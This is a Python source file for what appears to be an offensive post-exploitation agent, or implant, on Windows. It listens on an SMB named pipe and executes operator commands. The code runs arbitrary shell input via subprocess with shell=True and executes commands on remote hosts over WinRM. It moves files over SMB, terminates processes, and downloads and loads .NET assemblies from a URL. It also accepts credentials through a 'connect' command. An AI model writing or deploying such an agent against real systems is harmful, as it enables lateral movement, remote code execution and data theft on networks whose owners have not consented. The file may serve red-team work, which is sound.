# smb_agent.py

import time
import logging
import subprocess
from multiprocessing import Process, Pipe
import socket

import win32pipe
import win32file
import pywintypes

# Importing common library functions
from utils.winapi.ls import ls
from utils.winapi.list_users_in_group import list_users_in_group
from utils.winapi.smb_get import smb_get
from utils.winapi.smb_write import smb_write
from utils.winapi.winrm_execute import winrm_execute
from utils.winapi.pwd import wpwd
from utils.winapi.wami import wami
from utils.winapi.ps import list_processes, grep_processes, terminate_process
from utils.winapi.run import run_process
from utils.winapi.netexec import load_dotnet_assembly
from utils.winapi.hostname import get_hostname  # Import the new hostname module
from utils.winapi.nslookup import nslookup  # Import the new nslookup module
from utils.config import PIPENAME
from utils.file_operations import handle_download_command, handle_upload_command

logging.basicConfig(level=logging.INFO)

def get_hostname():
    return socket.gethostname()

def handle_command(command):
    try:
        if command.startswith("ls"):
            path = command.split(' ', 1)[1]
            result = ls(path)
        elif command.startswith("users"):
            group_name = command.split(' ', 1)[1]
            result = list_users_in_group(group_name)
        elif command.startswith("smb get"):
            parts = command.split()
            remote_file_path, local_file_path = parts[2], parts[3]
            result = smb_get(remote_file_path, local_file_path)
        elif command.startswith("smb write"):
            parts = command.split()
            local_file_path, remote_smb_path = parts[2], parts[3]
            result = smb_write(local_file_path, remote_smb_path)
        elif command.startswith("winrmexec"):
            parts = command.split()
            remote_host, cmd = parts[1], parts[2]
            result = winrm_execute(remote_host, cmd)
        elif command.startswith("pwd"):
            result = wpwd()
        elif command == "whoami":
            result = wami()
        elif command.startswith("ps grep"):
            pattern = command.split(' ', 2)[2]
            result = grep_processes(pattern)
        elif command == "ps":
            result = list_processes()
        elif command.startswith("ps term"):
            process_id = int(command.split(' ', 2)[2])
            result = terminate_process(process_id)
        elif command.startswith("run"):
            executable_path = command.split(' ', 1)[1]
            result = run_process(executable_path)
        elif command.startswith("netexec"):
            parts = command.split(maxsplit=2)
            file_url, arguments = parts[1], parts[2]
            output, error = load_dotnet_assembly(file_url, arguments)
            result = output if not error else f"{output}\n{error}"
        elif command.startswith("download"):
            result, error = handle_download_command(command)
            result = result if not error else f"{result}\n{error}"
        elif command.startswith("upload"):
            result, error = handle_upload_command(command)
            result = result if not error else f"{result}\n{error}"
        elif command.startswith("hostname"):
            result = get_hostname()
        elif command.startswith("nslookup"):
            host_to_lookup = command.split(' ', 1)[1]
            result = nslookup(host_to_lookup)
        else:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')

        if isinstance(result, list):
            result = "\n".join(result)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)

def smb_agent(pipe_conn):
    while True:
        try:
            logging.info("Waiting for client to connect to the pipe...")
            handle = win32pipe.CreateNamedPipe(
                PIPENAME,
                win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
                1, 65536, 65536,
                0,
                None
            )

            win32pipe.ConnectNamedPipe(handle, None)
            logging.info("Client connected to the pipe.")

            while True:
                try:
                    resp = win32file.ReadFile(handle, 64*1024)
                    command = resp[1].decode('utf-8').strip()
                    logging.info(f"Received command: {command}")

                    if command.lower() == 'disconnect':
                        logging.info("Disconnect command received.")
                        win32file.CloseHandle(handle)
                        break

                    if command.lower().startswith('connect'):
                        logging.info(f"Handling connect command with details: {command}")
                        parts = command.split()
                        if len(parts) > 1:
                            username = parts[1]
                        if len(parts) > 2:
                            password = parts[2]
                        if len(parts) > 3:
                            domain = parts[3]
                        continue

                    result = handle_command(command)
                    hostname = get_hostname()
                    response = f"{hostname}\n{result}"  # Include hostname in the response
                    win32file.WriteFile(handle, response.encode('utf-8'))
                except pywintypes.error as e:
                    logging.error(f"Pipe read/write error: {e}")
                    break
        except pywintypes.error as e:
            logging.error(f"Pipe creation error: {e}")

if __name__ == "__main__":
    parent_conn, child_conn = Pipe()
    p = Process(target=smb_agent, args=(child_conn,))
    p.start()
    while True:
        if parent_conn.poll():
            command = parent_conn.recv()
            if command == 'terminate':
                p.terminate()
                p.join()
                break
        time.sleep(1)
